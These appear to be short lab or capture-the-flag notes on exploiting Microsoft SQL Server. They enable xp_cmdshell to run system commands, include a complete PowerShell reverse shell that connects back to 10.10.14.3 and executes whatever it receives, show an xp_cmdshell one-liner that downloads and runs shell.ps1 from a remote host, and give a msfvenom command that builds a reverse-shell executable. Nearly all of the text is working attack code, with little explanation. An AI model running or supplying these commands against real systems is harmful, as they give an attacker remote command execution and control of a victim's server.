# exploittation
 go to insite and run: 
``` 
 EXEC sp_configure 'Show Advanced Options', 1;
reconfigure;
sp_configure;
EXEC sp_configure 'xp_cmdshell', 1
reconfigure;
xp_cmdshell "whoami"

```

ReverseShell:
```
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.3",443);$stream =
$client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =
$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName
System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 |
Out-String );$sendback2 = $sendback + "# ";$sendbyte =
([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyt
e.Length);$stream.Flush()};$client.Close()
``` 
save the shell.ps1 file. then using the python to download 

From the sql cmd: 

xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://IP/shell.ps1\");"

# msf venom

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.37 LPORT=53 -f exe -o reverse64.exe
```
